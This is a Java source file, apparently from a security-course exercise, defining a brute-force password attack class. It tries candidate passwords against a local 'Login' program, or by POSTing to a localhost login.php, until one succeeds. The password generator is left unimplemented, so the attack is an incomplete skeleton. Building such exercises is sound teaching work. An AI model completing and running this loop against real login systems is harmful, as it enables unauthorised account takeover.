
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers;
import utils.HttpUtils;

public class AttaqueBruteForce extends Attaque {

    @Override
    public void initier(String cible, String login) {
        switch (cible) {
            case "local":
                try {
                    String password;
                    while (true) {
                        password = generateNextPassword();
                        String[] command = {"java", "Login", login, password};
                        Process process = new ProcessBuilder(command).start();
                        BufferedReader resultat = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        String line;
                        while ((line = resultat.readLine()) != null) {
                            System.out.println(line);
                        }
                        int exitCode = process.waitFor();
                        if (exitCode == 1) {
                            System.out.println("Mot de passe trouve: " + password);
                            break;
                        }
                    }
                } catch (IOException | InterruptedException e) {
                    System.err.format("IOException: %s%n", e);
                }
                break;

            case "remote":
                String uri = "http://localhost/app/login.php";
                HttpClient client = HttpUtils.createHttpClient();
                try {
                    String password;
                    while (true) {
                        password = generateNextPassword();
                        HttpRequest request = HttpUtils.createPostRequest(uri, login, password);
                        HttpResponse<String> response = client.send(request, BodyHandlers.ofString());

                        System.out.print("Mot de passe: " + password);
                        System.out.println("Statut: " + response.statusCode());

                        if (response.statusCode() == 200) {
                            System.out.println("Mot de passe trouve: " + password);
                            break;
                        }
                    }
                } catch (Exception e) {
                    System.err.format("Exception: %s%n", e);
                }
                break;

            default:
                System.out.println("Type de cible non reconnu. Veuillez spécifier 'local' ou 'remote'.");
                break;
        }

    }

    private String generateNextPassword() {

        throw new UnsupportedOperationException("Not supported yet.");
    }
}
